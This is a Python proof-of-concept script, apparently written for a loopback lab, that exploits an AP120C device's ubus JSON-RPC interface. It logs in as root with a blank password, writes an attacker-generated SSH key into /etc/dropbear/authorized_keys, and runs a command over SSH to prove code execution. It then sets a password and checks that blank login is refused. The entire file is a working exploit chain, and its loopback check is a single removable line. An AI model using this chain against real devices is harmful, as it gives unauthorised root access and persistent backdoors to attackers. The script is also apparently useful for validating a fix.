#!/usr/bin/env python3
"""Validate blank-password-to-command-execution only in the loopback AP120C lab."""

from __future__ import annotations

import argparse
import json
import subprocess
import tempfile
import urllib.request
from pathlib import Path
from urllib.parse import urlsplit


def call(url: str, ident: int, token: str, object_name: str,
         method: str, arguments: dict[str, object]) -> object:
    body = json.dumps({
        "jsonrpc": "2.0",
        "id": ident,
        "method": "call",
        "params": [token, object_name, method, arguments],
    }).encode()
    request = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(request, timeout=8) as response:
        return json.load(response)


def result_data(response: object) -> dict[str, object]:
    if not isinstance(response, dict):
        raise RuntimeError(f"unexpected response: {response!r}")
    result = response.get("result")
    if not isinstance(result, list) or not result or result[0] != 0:
        raise RuntimeError(f"ubus call failed: {response!r}")
    if len(result) == 1:
        return {}
    if len(result) != 2:
        raise RuntimeError(f"unexpected result length: {response!r}")
    if not isinstance(result[1], dict):
        raise RuntimeError(f"unexpected result data: {response!r}")
    return result[1]


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://127.0.0.1:28085/ubus")
    args = parser.parse_args()
    parsed = urlsplit(args.url)
    if parsed.hostname not in {"127.0.0.1", "localhost", "::1"}:
        parser.error("only loopback targets are permitted")

    login = call(
        args.url, 1, "0" * 32, "session", "login",
        {"username": "root", "password": ""},
    )
    login_data = result_data(login)
    token = login_data.get("ubus_rpc_session")
    if not isinstance(token, str) or len(token) != 32:
        raise RuntimeError("blank-password login did not return a session")
    print("blank_password_admin_session=true")

    marker = "/tmp/FRIDAY_AP120C_BLANK_PASSWORD_RCE"
    with tempfile.TemporaryDirectory(prefix="friday-ap120c-key-") as directory:
        key = Path(directory) / "id_ed25519"
        subprocess.run(
            ["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(key)],
            check=True,
        )
        public_key = key.with_suffix(".pub").read_text()
        result_data(call(
            args.url, 2, token, "file", "write",
            {"path": "/etc/dropbear/authorized_keys", "data": public_key},
        ))
        print("authorized_key_write=true")

        execution = subprocess.run([
            "ssh", "-q", "-p", "22223", "-i", str(key),
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "root@127.0.0.1",
            f"echo FRIDAY_AP120C_RCE > {marker} && cat {marker}",
        ], check=True, timeout=15, capture_output=True, text=True)
        print("ssh_command_exit=true")

    if execution.stdout == "FRIDAY_AP120C_RCE\n":
        print("marker_created=true content='FRIDAY_AP120C_RCE'")
        result_data(call(
            args.url, 3, token, "luci", "setPassword",
            {"username": "root", "password": "FRIDAY-Configured-State-Only"},
        ))
        configured_login = call(
            args.url, 4, "0" * 32, "session", "login",
            {"username": "root", "password": ""},
        )
        configured_result = (
            configured_login.get("result")
            if isinstance(configured_login, dict) else None
        )
        denied = configured_result == [6]
        print(f"blank_password_after_configuration_denied={str(denied).lower()}")
        return 0 if denied else 1
    print(f"marker_created=false output={execution.stdout!r}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
